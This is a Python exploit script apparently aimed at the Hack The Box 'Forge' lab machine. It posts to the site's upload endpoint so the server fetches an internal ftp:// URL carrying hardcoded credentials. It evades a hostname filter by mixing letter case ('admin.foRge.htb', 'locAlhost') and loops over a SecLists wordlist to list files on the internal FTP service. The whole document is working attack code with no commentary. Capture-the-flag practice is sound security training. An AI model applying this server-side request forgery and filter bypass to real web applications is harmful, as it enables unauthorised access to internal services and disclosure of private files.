#!/usr/bin/python3

import requests
import re

URL = "http://forge.htb"

def main():
    file_wordlist = open("/opt/SecLists/Discovery/Web-Content/common.txt", "r")
    for line in file_wordlist:
        line = line.strip()

        url_to_upload = f"http://admin.foRge.htb/upload?u=ftp://user:heightofsecurity123!@locAlhost/{line}"
        data_post = {"url":url_to_upload,"remote":"1"}
        r = requests.post(URL + '/upload', data=data_post)

        url_with_response = re.findall(r'<strong><a href="(.*?)"', r.text)[0]
        r = requests.get(url_with_response)

        if "404 Not Found" in r.text or "500 Internal Server" in r.text:
            print(f"✘ {line}")
        else:
            print(f"{line} ✓")

if '__main__' == __name__:
    main()
